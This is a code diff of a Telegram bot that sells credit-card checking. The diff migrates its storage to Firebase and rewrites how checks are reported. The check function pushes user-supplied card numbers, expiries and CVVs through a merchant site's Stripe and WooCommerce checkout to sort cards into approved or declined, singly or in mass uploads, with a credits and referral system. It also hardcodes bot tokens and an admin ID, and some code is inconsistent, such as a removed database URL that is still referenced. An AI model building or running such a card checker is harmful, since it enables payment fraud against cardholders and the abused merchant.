@@ -5,6 +5,7 @@ import datetime
 import time
 import os
 import re
+import sys
 import aiohttp
 import string
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -14,6 +15,36 @@ from telegram.error import NetworkError, BadRequest, TimedOut
 import logging
 from telegram.helpers import escape_markdown
 import asyncpg
+# Simple Firebase setup
+import firebase_admin
+from firebase_admin import credentials, firestore
+import datetime
+
+def init_firebase():
+    """Initialize Firebase and return connection status"""
+    try:
+        cred = credentials.Certificate("firebase-creds.json")
+        firebase_admin.initialize_app(cred)
+        db = firestore.client()
+        print("✅ Firebase connected successfully")
+        
+        # Test connection
+        test_ref = db.collection('test').document('connection_test')
+        test_ref.set({'test': True, 'timestamp': datetime.datetime.now().isoformat()})
+        print("✅ Firebase write test successful")
+        
+        return db, True
+    except Exception as e:
+        print(f"⚠️  Firebase connection failed: {e}")
+        print("⚠️  Using in-memory storage (data will be lost on restart)")
+        return None, False
+
+# Initialize Firebase
+db, firebase_connected = init_firebase()
+
+def get_db():
+    """Get Firebase database instance"""
+    return db
 
 # Add this function to properly escape markdown
 def escape_markdown_v2(text):
@@ -25,6 +56,8 @@ def escape_markdown_v2(text):
         text = text.replace(char, f'\\{char}')
     return text
 
+# Rest of your code remains the same...<
+
 # Configure logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -33,12 +66,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Bot configuration
-BOT_TOKEN = "8163640062:AAFJm_0bYqBZTGFXHB7FlfJOC-PZVaFJ9Z4"
+BOT_TOKEN = "8572861347:AAEkPQQFkz7LqrzwA_gGz0qkQwZ6W2lzH9o"
 ADMIN_IDS = [8079395886]  # Your Telegram ID
 CHANNEL_LINK = "https://t.me/+zsK6NPGgvSc4NzM1"  # Your private channel link
-
-# Database configuration
-DATABASE_URL = "postgresql://postgres:[YOUR-PASSWORD]@db.bipzipmraeyjirghdlbm.supabase.co:5432/postgres"  # Update with your Supabase credentials
 
 # Stripe configuration
 DOMAIN = "https://dainte.com"
@@ -108,156 +138,6 @@ BILLING_ADDRESSES = {
 # Database connection pool
 db_pool = None
 
-async def init_database():
-    """Initialize database connection"""
-    global db_pool
-    try:
-        db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=10)
-        logger.info("Database connection established")
-        
-        # Create tables if they don't exist
-        async with db_pool.acquire() as conn:
-            await conn.execute('''
-                CREATE TABLE IF NOT EXISTS users (
-                    user_id BIGINT PRIMARY KEY,
-                    username TEXT,
-                    first_name TEXT,
-                    joined_date TIMESTAMP DEFAULT NOW(),
-                    last_active TIMESTAMP DEFAULT NOW(),
-                    credits INTEGER DEFAULT 0,
-                    credits_spent INTEGER DEFAULT 0,
-                    total_checks INTEGER DEFAULT 0,
-                    approved_cards INTEGER DEFAULT 0,
-                    declined_cards INTEGER DEFAULT 0,
-                    checks_today INTEGER DEFAULT 0,
-                    last_check_date DATE,
-                    joined_channel BOOLEAN DEFAULT FALSE,
-                    referrer_id BIGINT,
-                    referrals_count INTEGER DEFAULT 0,
-                    earned_from_referrals INTEGER DEFAULT 0
-                )
-            ''')
-            
-            await conn.execute('''
-                CREATE TABLE IF NOT EXISTS gift_codes (
-                    code TEXT PRIMARY KEY,
-                    credits INTEGER NOT NULL,
-                    max_uses INTEGER,
-                    uses INTEGER DEFAULT 0,
-                    created_at TIMESTAMP DEFAULT NOW(),
-                    created_by BIGINT,
-                    claimed_by TEXT[] DEFAULT '{}'
-                )
-            ''')
-            
-            await conn.execute('''
-                CREATE TABLE IF NOT EXISTS user_claimed_codes (
-                    user_id BIGINT,
-                    code TEXT,
-                    claimed_at TIMESTAMP DEFAULT NOW(),
-                    PRIMARY KEY (user_id, code)
-                )
-            ''')
-            
-            await conn.execute('''
-                CREATE TABLE IF NOT EXISTS bot_statistics (
-                    id SERIAL PRIMARY KEY,
-                    total_checks INTEGER DEFAULT 0,
-                    total_approved INTEGER DEFAULT 0,
-                    total_declined INTEGER DEFAULT 0,
-                    total_credits_used INTEGER DEFAULT 0,
-                    total_users INTEGER DEFAULT 0,
-                    start_time TIMESTAMP DEFAULT NOW()
-                )
-            ''')
-            
-            # Initialize bot statistics if not exists
-            await conn.execute('''
-                INSERT INTO bot_statistics (id) VALUES (1)
-                ON CONFLICT (id) DO NOTHING
-            ''')
-            
-            logger.info("Database tables created/verified")
-            
-    except Exception as e:
-        logger.error(f"Database initialization error: {e}")
-        raise
-
-async def get_user(user_id):
-    """Get user from database"""
-    async with db_pool.acquire() as conn:
-        user = await conn.fetchrow('SELECT * FROM users WHERE user_id = $1', user_id)
-        if not user:
-            # Create new user
-            await conn.execute('''
-                INSERT INTO users (user_id, joined_date, last_active)
-                VALUES ($1, NOW(), NOW())
-            ''', user_id)
-            # Increment total users in statistics
-            await conn.execute('''
-                UPDATE bot_statistics 
-                SET total_users = total_users + 1 
-                WHERE id = 1
-            ''')
-            # Fetch the newly created user
-            user = await conn.fetchrow('SELECT * FROM users WHERE user_id = $1', user_id)
-        return user
-
-async def update_user(user_id, updates):
-    """Update user data in database"""
-    async with db_pool.acquire() as conn:
-        set_clause = ', '.join([f"{k} = ${i+2}" for i, k in enumerate(updates.keys())])
-        values = [user_id] + list(updates.values())
-        query = f'UPDATE users SET {set_clause}, last_active = NOW() WHERE user_id = $1'
-        await conn.execute(query, *values)
-
-async def get_bot_stats():
-    """Get bot statistics from database"""
-    async with db_pool.acquire() as conn:
-        stats = await conn.fetchrow('SELECT * FROM bot_statistics WHERE id = 1')
-        return stats
-
-async def update_bot_stats(updates):
-    """Update bot statistics"""
-    async with db_pool.acquire() as conn:
-        set_clause = ', '.join([f"{k} = {k} + ${i+1}" for i, k in enumerate(updates.keys())])
-        values = list(updates.values())
-        query = f'UPDATE bot_statistics SET {set_clause} WHERE id = 1'
-        await conn.execute(query, *values)
-
-async def create_gift_code(code, credits, max_uses, created_by):
-    """Create a gift code in database"""
-    async with db_pool.acquire() as conn:
-        await conn.execute('''
-            INSERT INTO gift_codes (code, credits, max_uses, created_by)
-            VALUES ($1, $2, $3, $4)
-        ''', code, credits, max_uses, created_by)
-
-async def get_gift_code(code):
-    """Get gift code from database"""
-    async with db_pool.acquire() as conn:
-        return await conn.fetchrow('SELECT * FROM gift_codes WHERE code = $1', code)
-
-async def update_gift_code_usage(code, user_id):
-    """Update gift code usage"""
-    async with db_pool.acquire() as conn:
-        await conn.execute('''
-            UPDATE gift_codes 
-            SET uses = uses + 1, claimed_by = array_append(claimed_by, $2::text)
-            WHERE code = $1
-        ''', code, str(user_id))
-        
-        await conn.execute('''
-            INSERT INTO user_claimed_codes (user_id, code)
-            VALUES ($1, $2)
-            ON CONFLICT (user_id, code) DO NOTHING
-        ''', user_id, code)
-
-async def get_all_gift_codes():
-    """Get all gift codes"""
-    async with db_pool.acquire() as conn:
-        return await conn.fetch('SELECT * FROM gift_codes ORDER BY created_at DESC')
-
 def parseX(data, start, end):
     try:
         if not data or not start or not end:
@@ -307,6 +187,406 @@ checking_tasks = {}
 files_storage = {}
 setup_intent_cache = {}
 last_cache_time = 0
+
+async def init_database():
+    """Initialize database connection with retry mechanism"""
+    global db_pool
+    max_retries = 3
+    retry_delay = 5
+    
+    for attempt in range(max_retries):
+        try:
+            logger.info(f"Attempting database connection (Attempt {attempt + 1}/{max_retries})...")
+            
+            # Try to connect with SSL mode 'require' for Supabase
+            try:
+                db_pool = await asyncpg.create_pool(
+                    DATABASE_URL,
+                    **DB_CONNECTION_PARAMS,
+                    ssl='require'  # Supabase requires SSL
+                )
+            except Exception as ssl_error:
+                logger.warning(f"SSL connection failed, trying without SSL: {ssl_error}")
+                # Try without SSL if SSL fails
+                db_pool = await asyncpg.create_pool(
+                    DATABASE_URL,
+                    **DB_CONNECTION_PARAMS,
+                    ssl=False
+                )
+            
+            # Test connection
+            async with db_pool.acquire() as conn:
+                # Simple test query
+                result = await conn.fetchval('SELECT 1')
+                if result == 1:
+                    logger.info("Database connection established and tested successfully")
+                else:
+                    raise Exception("Database test query failed")
+            
+            # Create tables if they don't exist
+            await create_tables()
+            logger.info("Database tables created/verified")
+            return True
+            
+        except asyncpg.InvalidPasswordError:
+            logger.error("❌ Invalid database password. Please check your credentials.")
+            return False
+        except asyncpg.ConnectionDoesNotExistError:
+            logger.error("❌ Database connection failed. Host may be unreachable.")
+        except asyncpg.PostgresError as e:
+            logger.error(f"❌ Database error: {e}")
+        except Exception as e:
+            logger.error(f"❌ Database initialization error: {str(e)}")
+        
+        if attempt < max_retries - 1:
+            logger.info(f"Retrying in {retry_delay} seconds...")
+            await asyncio.sleep(retry_delay)
+    
+    logger.error("Failed to connect to database after multiple attempts")
+    return False
+
+async def create_tables():
+    """Create database tables"""
+    async with db_pool.acquire() as conn:
+        # Users table
+        await conn.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                user_id BIGINT PRIMARY KEY,
+                username TEXT,
+                first_name TEXT,
+                joined_date TIMESTAMP DEFAULT NOW(),
+                last_active TIMESTAMP DEFAULT NOW(),
+                credits INTEGER DEFAULT 0,
+                credits_spent INTEGER DEFAULT 0,
+                total_checks INTEGER DEFAULT 0,
+                approved_cards INTEGER DEFAULT 0,
+                declined_cards INTEGER DEFAULT 0,
+                checks_today INTEGER DEFAULT 0,
+                last_check_date DATE,
+                joined_channel BOOLEAN DEFAULT FALSE,
+                referrer_id BIGINT,
+                referrals_count INTEGER DEFAULT 0,
+                earned_from_referrals INTEGER DEFAULT 0
+            )
+        ''')
+        
+        # Gift codes table
+        await conn.execute('''
+            CREATE TABLE IF NOT EXISTS gift_codes (
+                code TEXT PRIMARY KEY,
+                credits INTEGER NOT NULL,
+                max_uses INTEGER,
+                uses INTEGER DEFAULT 0,
+                created_at TIMESTAMP DEFAULT NOW(),
+                created_by BIGINT,
+                claimed_by TEXT[] DEFAULT '{}'
+            )
+        ''')
+        
+        # Claimed codes table
+        await conn.execute('''
+            CREATE TABLE IF NOT EXISTS user_claimed_codes (
+                user_id BIGINT,
+                code TEXT,
+                claimed_at TIMESTAMP DEFAULT NOW(),
+                PRIMARY KEY (user_id, code)
+            )
+        ''')
+        
+        # Bot statistics table
+        await conn.execute('''
+            CREATE TABLE IF NOT EXISTS bot_statistics (
+                id SERIAL PRIMARY KEY,
+                total_checks INTEGER DEFAULT 0,
+                total_approved INTEGER DEFAULT 0,
+                total_declined INTEGER DEFAULT 0,
+                total_credits_used INTEGER DEFAULT 0,
+                total_users INTEGER DEFAULT 0,
+                start_time TIMESTAMP DEFAULT NOW()
+            )
+        ''')
+        
+        # Initialize bot statistics
+        await conn.execute('''
+            INSERT INTO bot_statistics (id) VALUES (1)
+            ON CONFLICT (id) DO NOTHING
+        ''')
+
+# In-memory storage as fallback
+in_memory_users = {}
+in_memory_gift_codes = {}
+in_memory_claimed_codes = {}
+in_memory_bot_stats = {
+    "total_checks": 0,
+    "total_approved": 0,
+    "total_declined": 0,
+    "total_credits_used": 0,
+    "total_users": 0,
+    "start_time": datetime.datetime.now().isoformat()
+}
+
+# Firebase functions to replace PostgreSQL functions
+async def get_user(user_id):
+    """Get user from Firebase or memory"""
+    db = get_db()
+    
+    if db:
+        try:
+            user_ref = db.collection('users').document(str(user_id))
+            user_doc = user_ref.get()
+            
+            if user_doc.exists:
+                return user_doc.to_dict()
+            else:
+                # Create new user
+                new_user = {
+                    "user_id": user_id,
+                    "username": "",
+                    "first_name": "",
+                    "joined_date": firestore.SERVER_TIMESTAMP,
+                    "last_active": firestore.SERVER_TIMESTAMP,
+                    "credits": 0,
+                    "credits_spent": 0,
+                    "total_checks": 0,
+                    "approved_cards": 0,
+                    "declined_cards": 0,
+                    "checks_today": 0,
+                    "last_check_date": None,
+                    "joined_channel": False,
+                    "referrer_id": None,
+                    "referrals_count": 0,
+                    "earned_from_referrals": 0
+                }
+                user_ref.set(new_user)
+                
+                # Update bot statistics
+                stats_ref = db.collection('bot_statistics').document('stats')
+                stats_doc = stats_ref.get()
+                if stats_doc.exists:
+                    stats_ref.update({"total_users": firestore.Increment(1)})
+                else:
+                    stats_ref.set({
+                        "total_checks": 0,
+                        "total_approved": 0,
+                        "total_declined": 0,
+                        "total_credits_used": 0,
+                        "total_users": 1,
+                        "start_time": firestore.SERVER_TIMESTAMP
+                    })
+                
+                return new_user
+                
+        except Exception as e:
+            logger.error(f"Firebase error in get_user: {e}")
+    
+    # Fallback to in-memory storage
+    if user_id not in in_memory_users:
+        in_memory_users[user_id] = {
+            "user_id": user_id,
+            "username": "",
+            "first_name": "",
+            "joined_date": datetime.datetime.now().isoformat(),
+            "last_active": datetime.datetime.now().isoformat(),
+            "credits": 0,
+            "credits_spent": 0,
+            "total_checks": 0,
+            "approved_cards": 0,
+            "declined_cards": 0,
+            "checks_today": 0,
+            "last_check_date": None,
+            "joined_channel": False,
+            "referrer_id": None,
+            "referrals_count": 0,
+            "earned_from_referrals": 0
+        }
+        in_memory_bot_stats["total_users"] += 1
+    
+    return in_memory_users[user_id]
+
+async def update_user(user_id, updates):
+    """Update user data in Firebase or memory"""
+    db = get_db()
+    
+    # Convert datetime.date to string for Firebase
+    processed_updates = updates.copy()
+    for key, value in updates.items():
+        if isinstance(value, datetime.date):
+            processed_updates[key] = value.isoformat()
+        elif isinstance(value, datetime.datetime):
+            processed_updates[key] = value.isoformat()
+    
+    if db:
+        try:
+            user_ref = db.collection('users').document(str(user_id))
+            
+            # Remove last_active from processed_updates if it exists
+            if 'last_active' in processed_updates:
+                processed_updates['last_active'] = firestore.SERVER_TIMESTAMP
+            else:
+                processed_updates['last_active'] = firestore.SERVER_TIMESTAMP
+            
+            user_ref.update(processed_updates)
+            return
+        except Exception as e:
+            logger.error(f"Firebase error in update_user: {e}")
+            # Try without SERVER_TIMESTAMP as fallback
+            try:
+                user_ref = db.collection('users').document(str(user_id))
+                if 'last_active' in processed_updates:
+                    processed_updates['last_active'] = datetime.datetime.now().isoformat()
+                user_ref.update(processed_updates)
+                return
+            except Exception as e2:
+                logger.error(f"Firebase fallback error in update_user: {e2}")
+    
+    # Fallback to in-memory storage
+    if user_id in in_memory_users:
+        in_memory_users[user_id].update(processed_updates)
+        in_memory_users[user_id]["last_active"] = datetime.datetime.now().isoformat()
+
+async def get_bot_stats():
+    """Get bot statistics from Firebase"""
+    db = get_db()
+    
+    if db:
+        try:
+            stats_ref = db.collection('bot_statistics').document('stats')
+            stats_doc = stats_ref.get()
+            if stats_doc.exists:
+                return stats_doc.to_dict()
+        except Exception as e:
+            logger.error(f"Firebase error in get_bot_stats: {e}")
+    
+    # Fallback to in-memory
+    return in_memory_bot_stats
+
+async def update_bot_stats(updates):
+    """Update bot statistics in Firebase"""
+    db = get_db()
+    
+    if db:
+        try:
+            stats_ref = db.collection('bot_statistics').document('stats')
+            
+            # Prepare update dictionary with Increment operations
+            firestore_updates = {}
+            for key, value in updates.items():
+                firestore_updates[key] = firestore.Increment(value)
+            
+            stats_ref.update(firestore_updates)
+            return
+        except Exception as e:
+            logger.error(f"Firebase error in update_bot_stats: {e}")
+    
+    # Fallback to in-memory
+    for key, value in updates.items():
+        if key in in_memory_bot_stats:
+            in_memory_bot_stats[key] += value
+
+async def get_all_gift_codes():
+    """Get all gift codes from Firebase"""
+    db = get_db()
+    
+    if db:
+        try:
+            codes_ref = db.collection('gift_codes')
+            codes_docs = codes_ref.stream()
+            
+            gift_codes = []
+            for doc in codes_docs:
+                gift_codes.append(doc.to_dict())
+            
+            return gift_codes
+        except Exception as e:
+            logger.error(f"Firebase error in get_all_gift_codes: {e}")
+    
+    # Fallback to in-memory
+    return list(in_memory_gift_codes.values())
+
+async def create_gift_code(code, credits, max_uses, created_by):
+    """Create a gift code in Firebase"""
+    db = get_db()
+    
+    if db:
+        try:
+            gift_ref = db.collection('gift_codes').document(code)
+            gift_ref.set({
+                "code": code,
+                "credits": credits,
+                "max_uses": max_uses,
+                "uses": 0,
+                "created_at": firestore.SERVER_TIMESTAMP,
+                "created_by": created_by,
+                "claimed_by": []
+            })
+            return True
+        except Exception as e:
+            logger.error(f"Firebase error in create_gift_code: {e}")
+    
+    # Fallback to in-memory
+    in_memory_gift_codes[code] = {
+        "code": code,
+        "credits": credits,
+        "max_uses": max_uses,
+        "uses": 0,
+        "created_at": datetime.datetime.now().isoformat(),
+        "created_by": created_by,
+        "claimed_by": []
+    }
+    return True
+
+async def get_gift_code(code):
+    """Get gift code from Firebase"""
+    db = get_db()
+    
+    if db:
+        try:
+            gift_ref = db.collection('gift_codes').document(code)
+            gift_doc = gift_ref.get()
+            if gift_doc.exists:
+                return gift_doc.to_dict()
+        except Exception as e:
+            logger.error(f"Firebase error in get_gift_code: {e}")
+    
+    # Fallback to in-memory
+    return in_memory_gift_codes.get(code)
+
+async def update_gift_code_usage(code, user_id):
+    """Update gift code usage in Firebase"""
+    db = get_db()
+    
+    if db:
+        try:
+            gift_ref = db.collection('gift_codes').document(code)
+            
+            # Update uses and claimed_by
+            gift_ref.update({
+                "uses": firestore.Increment(1),
+                "claimed_by": firestore.ArrayUnion([str(user_id)])
+            })
+            
+            # Add to claimed codes
+            claimed_ref = db.collection('user_claimed_codes').document(f"{user_id}_{code}")
+            claimed_ref.set({
+                "user_id": user_id,
+                "code": code,
+                "claimed_at": firestore.SERVER_TIMESTAMP
+            })
+            
+            return True
+        except Exception as e:
+            logger.error(f"Firebase error in update_gift_code_usage: {e}")
+    
+    # Fallback to in-memory
+    if code in in_memory_gift_codes:
+        in_memory_gift_codes[code]["uses"] += 1
+        in_memory_gift_codes[code]["claimed_by"].append(str(user_id))
+        
+        if user_id not in in_memory_claimed_codes:
+            in_memory_claimed_codes[user_id] = []
+        in_memory_claimed_codes[user_id].append(code)
+    
+    return True
 
 async def get_setup_intent():
     """Get setup intent nonce with caching"""
@@ -379,18 +659,18 @@ async def quick_check_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         pass
     
     await query.edit_message_text(
-        "*⚡ QUICK CARD CHECK*\n"
+        "<b>⚡ QUICK CARD CHECK</b>\n"
         "══════════════════════\n"
         "To check a card, use:\n"
-        "`/chk cc|mm|yy|cvv`\n\n"
-        "*Example:*\n"
-        "`/chk 4111111111111111|12|2025|123`\n\n"
-        "*Features:*\n"
+        "<code>/chk cc|mm|yy|cvv</code>\n\n"
+        "<b>Example:</b>\n"
+        "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
+        "<b>Features:</b>\n"
         "• ⚡ Instant results\n"
         "• Cost: 1 credit\n"
         "• Speed: Instant\n\n"
-        "*Try it now!*",
-        parse_mode=ParseMode.MARKDOWN,
+        "<b>Try it now!</b>",
+        parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
     )
 
@@ -531,6 +811,7 @@ async def invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
     
     user_id = query.from_user.id
+    user = await get_user(user_id)
     
     # Generate invite link
     bot_username = (await context.bot.get_me()).username
@@ -547,8 +828,9 @@ async def invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"   • You get 50 credits\n"
         f"   • They get 10 credits\n"
         f"3. Earn unlimited credits!\n\n"
-        f"*Your Referrals:* {0}\n"  # We'll add this later
-        f"*Earned from Referrals:* {0} credits\n\n"  # We'll add this later
+        f"*Your Stats:*\n"
+        f"• Referrals: {user.get('referrals_count', 0)} users\n"
+        f"• Earned from Referrals: {user.get('earned_from_referrals', 0)} credits\n\n"
         f"*Copy and share your link now!*",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=InlineKeyboardMarkup([
@@ -633,7 +915,7 @@ async def check_single_card_fast(card):
         # Get setup intent (cached)
         setup_intent_nonce, session = await get_setup_intent()
         if not setup_intent_nonce or not session:
-            return card, "declined", "Setup error", 0
+            return card, "declined", "❌ Setup Error - No session", 0
         
         # Step 1: Create payment method with Stripe (FAST)
         headers1 = {
@@ -665,23 +947,36 @@ async def check_single_card_fast(card):
                 if response.status == 200:
                     req1 = await response.text()
                 else:
-                    return card, "declined", f"Stripe HTTP {response.status}", response.status
+                    # Return as error, not actual decline
+                    return card, "declined", f"❌ HTTP Error {response.status}", response.status
         except asyncio.TimeoutError:
-            return card, "declined", "Stripe timeout", 0
-        except Exception:
-            return card, "declined", "Stripe error", 0
+            return card, "declined", "❌ Stripe Timeout", 0
+        except Exception as e:
+            return card, "declined", f"❌ Network Error", 0
         
         try:
             pm_data = json.loads(req1)
             if 'error' in pm_data:
                 error_msg = pm_data['error'].get('message', 'Stripe error')
-                return card, "declined", f"Stripe: {error_msg[:25]}", pm_data['error'].get('code', 0)
+                error_type = pm_data['error'].get('type', '')
+                error_code = pm_data['error'].get('code', '')
+                
+                # Check error type to determine if it's an actual card decline
+                is_card_error = any(x in error_type.lower() for x in ['card_error', 'invalid_request_error'])
+                is_decline = any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient', 'invalid', 'incorrect', 'expired'])
+                
+                if is_card_error or is_decline:
+                    # This is an actual card decline - deduct credit
+                    return card, "declined", f"❌ Card: {error_msg[:30]}", pm_data['error'].get('code', 0)
+                else:
+                    # This is a system error - don't deduct credit
+                    return card, "declined", f"❌ Error: {error_msg[:30]}", pm_data['error'].get('code', 0)
             
             pmid = pm_data.get('id')
             if not pmid:
-                return card, "declined", "No payment ID", 0
+                return card, "declined", "❌ No Payment ID", 0
         except json.JSONDecodeError:
-            return card, "declined", "Invalid response", 0
+            return card, "declined", "❌ Invalid Response", 0
         
         # Step 2: Send to WooCommerce (FAST)
         headers2 = {
@@ -705,11 +1000,12 @@ async def check_single_card_fast(card):
                 if response.status == 200:
                     req2 = await response.text()
                 else:
-                    return card, "declined", f"AJAX HTTP {response.status}", response.status
+                    # HTTP error - don't deduct credit
+                    return card, "declined", f"❌ Server Error {response.status}", response.status
         except asyncio.TimeoutError:
-            return card, "declined", "AJAX timeout", 0
+            return card, "declined", "❌ AJAX Timeout", 0
         except Exception:
-            return card, "declined", "AJAX error", 0
+            return card, "declined", "❌ AJAX Error", 0
         
         try:
             result_data = json.loads(req2)
@@ -723,14 +1019,18 @@ async def check_single_card_fast(card):
                             error_obj = result_data['data']['error']
                             if isinstance(error_obj, dict):
                                 error_msg = error_obj.get('message', 'Declined')
-                return card, "declined", error_msg[:25], 0
+                                # Check if this is an actual card decline
+                                if any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient']):
+                                    return card, "declined", f"❌ Card: {error_msg[:30]}", 0
+                # If we get here, it's a general decline/error
+                return card, "declined", f"❌ {error_msg[:30]}", 0
         except json.JSONDecodeError:
-            return card, "declined", "Invalid JSON", 0
+            return card, "declined", "❌ Invalid JSON", 0
                 
     except ValueError:
-        return card, "declined", "Invalid format", 0
+        return card, "declined", "❌ Invalid Format", 0
     except Exception as e:
-        return card, "declined", f"Error: {str(e)[:20]}", 0
+        return card, "declined", f"❌ Error: {str(e)[:20]}", 0
 
 async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle mass check callback"""
@@ -767,7 +1067,7 @@ def format_card_result(card, status, message, credits_left=None, user_stats=None
         cc, mon, year, cvv = card.split("|")
         masked_card = f"{cc[:6]}******{cc[-4:]}"
     except:
-        return f"❌ *Invalid card format*: `{card}`"
+        return f"❌ <b>Invalid card format:</b> <code>{card}</code>"
     
     if status == "approved":
         emoji = "✅"
@@ -779,22 +1079,22 @@ def format_card_result(card, status, message, credits_left=None, user_stats=None
         status_text = "DECLINED"
     
     result = f"""
-{color} *{status_text}* {color}
+{color} <b>{status_text}</b> {color}
 ══════════════════════
-*Card:* `{masked_card}`
-*Expiry:* {mon}/{year}
-*CVV:* `{cvv}`
-*Status:* {emoji} {status_text}
-*Response:* {message}
+<b>Card:</b> <code>{masked_card}</code>
+<b>Expiry:</b> {mon}/{year}
+<b>CVV:</b> <code>{cvv}</code>
+<b>Status:</b> {emoji} {status_text}
+<b>Response:</b> {message}
 ══════════════════════
 """
     
     if credits_left is not None:
-        result += f"*Credits Left:* {credits_left}\n"
+        result += f"<b>Credits Left:</b> {credits_left}\n"
     
     if user_stats:
-        result += f"*Today:* ✅{user_stats['approved']} ❌{user_stats['declined']}\n"
-        result += f"*Total:* ✅{user_stats['total_approved']} ❌{user_stats['total_declined']}\n"
+        result += f"<b>Today:</b> ✅{user_stats['approved']} ❌{user_stats['declined']}\n"
+        result += f"<b>Total:</b> ✅{user_stats['total_approved']} ❌{user_stats['total_declined']}\n"
     
     result += "══════════════════════"
     return result
@@ -803,7 +1103,6 @@ def format_card_result(card, status, message, credits_left=None, user_stats=None
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command with referral system"""
-    # Determine if this is from message or callback
     if update.message:
         message = update.message
         user_id = update.effective_user.id
@@ -829,50 +1128,55 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Update user info if needed
     updates = {}
-    if user['username'] != username:
+    if user.get('username', '') != username:
         updates['username'] = username
-    if user['first_name'] != user_name:
+    if user.get('first_name', '') != user_name:
         updates['first_name'] = user_name
     
     # Handle referral if it's a new user with referrer
-    if referrer_id and referrer_id != user_id and not user['referrer_id']:
+    if referrer_id and referrer_id != user_id and not user.get('referrer_id'):
         updates['referrer_id'] = referrer_id
+        updates['credits'] = user.get('credits', 0) + 100  # New user gets 10 credits
         
-        # Add credits to new user
-        updates['credits'] = user['credits'] + 10
-        
-        # Update referrer's credits
-        async with db_pool.acquire() as conn:
-            await conn.execute('''
-                UPDATE users 
-                SET credits = credits + 50, 
-                    referrals_count = referrals_count + 1,
-                    earned_from_referrals = earned_from_referrals + 50
-                WHERE user_id = $1
-            ''', referrer_id)
+        # Update referrer's credits in Firebase
+        try:
+            referrer_ref = db.collection('users').document(str(referrer_id))
+            referrer_ref.update({
+                "credits": firestore.Increment(50),
+                "referrals_count": firestore.Increment(1),
+                "earned_from_referrals": firestore.Increment(50)
+            })
+        except Exception as e:
+            logger.error(f"Error updating referrer: {e}")
     
     if updates:
         await update_user(user_id, updates)
         user = await get_user(user_id)  # Refresh user data
     
     # Check channel membership
-    if not user['joined_channel']:
+    if not user.get('joined_channel', False):
         keyboard = [
             [InlineKeyboardButton("✅ Join Private Channel", url=CHANNEL_LINK)],
             [InlineKeyboardButton("🔄 Verify Join", callback_data="verify_join")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
+        # Use HTML parsing to avoid markdown issues
+        welcome_text = f"""<b>🔒 PRIVATE CHANNEL ACCESS REQUIRED</b>
+══════════════════════
+To access {BOT_INFO['name']}, you must join our private channel.
+
+<b>Steps:</b>
+1. Click 'Join Private Channel'
+2. Wait for admin approval
+3. Click 'Verify Join'
+
+<i>Note: Private channel requires manual approval.</i>
+"""
+        
         await message.reply_text(
-            f"*🔒 PRIVATE CHANNEL ACCESS REQUIRED*\n"
-            f"══════════════════════\n"
-            f"To access {BOT_INFO['name']}, you must join our private channel.\n\n"
-            f"**Steps:**\n"
-            f"1. Click 'Join Private Channel'\n"
-            f"2. Wait for admin approval\n"
-            f"3. Click 'Verify Join'\n\n"
-            f"*Note:* Private channel requires manual approval.",
-            parse_mode=ParseMode.MARKDOWN,
+            welcome_text,
+            parse_mode=ParseMode.HTML,
             reply_markup=reply_markup
         )
         return
@@ -885,43 +1189,48 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Check if user came from referral
     referral_bonus_text = ""
-    if user['referrer_id']:
-        referral_bonus_text = f"🎁 *Referral Bonus:* +10 credits (from invitation)\n"
+    if user.get('referrer_id'):
+        referral_bonus_text = f"🎁 <b>Referral Bonus:</b> +10 credits (from invitation)\n"
     
-    # Prepare welcome message
-    welcome_text = f"""*{BOT_INFO['name']}*
+    # Prepare welcome message using HTML
+    user_credits = user.get('credits', 0)
+    approved_cards = user.get('approved_cards', 0)
+    declined_cards = user.get('declined_cards', 0)
+    total_checks = user.get('total_checks', 0)
+    
+    welcome_text = f"""<b>{BOT_INFO['name']}</b>
 ══════════════════════
-👋 *Welcome, {user_name or 'User'}!*
+👋 <b>Welcome, {escape_markdown_v2(user_name) or 'User'}!</b>
 
-*Account Overview:*
-• Credits: *{user['credits']}*
-• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
-• Total Checks: *{user['total_checks']}*
+<b>Account Overview:</b>
+• Credits: <b>{user_credits}</b>
+• Today: ✅ {approved_cards} ❌ {declined_cards}
+• Total Checks: <b>{total_checks}</b>
 {referral_bonus_text}
-*User Commands:*
-• `/chk cc|mm|yy|cvv` - Check single card
-• `/mchk` - Upload file for mass check
-• `/credits` - Check balance
-• `/claim CODE` - Redeem gift code
-• `/info` - Bot information
-• `/invite` - Invite friends & earn credits
-• `/cancel` - Cancel mass check
-• `/help` - This help
+<b>User Commands:</b>
+• <code>/chk cc|mm|yy|cvv</code> - Check single card
+• <code>/mchk</code> - Upload file for mass check
+• <code>/credits</code> - Check balance
+• <code>/claim CODE</code> - Redeem gift code
+• <code>/info</code> - Bot information
+• <code>/invite</code> - Invite friends & earn credits
+• <code>/cancel</code> - Cancel mass check
+• <code>/help</code> - This help
 """
     
     # Add admin commands if user is admin
     if is_admin:
         welcome_text += """
-*Admin Commands:*
-• `/addcr user_id amount` - Add credits
-• `/gengift credits max_uses` - Create gift code
-• `/listgifts` - List all gift codes
-• `/userinfo user_id` - View user info
-• `/botinfo` - Bot statistics
+<b>Admin Commands:</b>
+• <code>/addcr user_id amount</code> - Add credits
+• <code>/gengift credits max_uses</code> - Create gift code
+• <code>/listgifts</code> - List all gift codes
+• <code>/userinfo user_id</code> - View user info
+• <code>/botinfo</code> - Bot statistics
 """
     
     welcome_text += """
